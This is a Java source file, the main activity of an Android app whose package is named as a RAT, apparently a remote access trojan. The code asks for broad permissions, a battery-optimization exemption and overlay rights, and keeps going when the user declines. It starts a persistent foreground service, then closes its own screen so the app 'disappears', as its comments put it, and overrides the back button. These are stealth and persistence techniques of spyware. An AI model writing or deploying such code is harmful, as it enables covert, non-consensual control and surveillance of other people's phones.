package com.fly0rakoon.rat;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.fly0rakoon.rat.services.ForegroundService;
import com.fly0rakoon.rat.utils.Constants;
import com.fly0rakoon.rat.utils.PermissionHelper;

public class MainActivity extends AppCompatActivity {
    
    private boolean mIsServiceBound = false;
    private ForegroundService mForegroundService;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Set transparent background (no layout needed)
        // This makes the app appear to "disappear" when opened
        
        // Start the process
        initializeApp();
    }
    
    private void initializeApp() {
        // Request all permissions first
        if (!PermissionHelper.hasAllPermissions(this)) {
            PermissionHelper.requestAllPermissions(this, Constants.PERMISSION_REQUEST_CODE);
            return;
        }
        
        // Check for special permissions based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Request ignore battery optimization
            if (!PermissionHelper.isIgnoringBatteryOptimizations(this)) {
                PermissionHelper.requestIgnoreBatteryOptimizations(this);
                return;
            }
            
            // Request overlay permission
            if (!PermissionHelper.canDrawOverlays(this)) {
                PermissionHelper.requestOverlayPermission(this);
                return;
            }
        }
        
        // All permissions granted, start the service
        proceedWithService();
    }
    
    private void proceedWithService() {
        // Start foreground service
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Bind to the service
        bindService(serviceIntent, mServiceConnection, Context.BIND_AUTO_CREATE);
        
        // Finish activity immediately - app will "disappear"
        finish();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == Constants.PERMISSION_REQUEST_CODE) {
            // Check if all permissions were granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                // Permissions granted, continue initialization
                initializeApp();
            } else {
                // Some permissions denied - show message and close
                Toast.makeText(this, "Permissions required for full functionality", Toast.LENGTH_LONG).show();
                
                // Try to continue with available permissions
                initializeApp();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == Constants.IGNORE_BATTERY_CODE) {
            // Check if battery optimization is now ignored
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    initializeApp();
                } else {
                    // User denied, try to continue anyway
                    initializeApp();
                }
            }
        } else if (requestCode == Constants.OVERLAY_PERMISSION_CODE) {
            // Check if overlay permission is now granted
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    initializeApp();
                } else {
                    // User denied, continue anyway
                    initializeApp();
                }
            }
        }
    }
    
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            ForegroundService.ForegroundBinder binder = (ForegroundService.ForegroundBinder) service;
            mForegroundService = binder.getService();
            mIsServiceBound = true;
        }
        
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mIsServiceBound = false;
        }
    };
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mIsServiceBound) {
            unbindService(mServiceConnection);
        }
    }
    
    // Prevent back button from doing anything
    @Override
    public void onBackPressed() {
        // Do nothing - prevent user from going back to a blank screen
        moveTaskToBack(true);
    }
}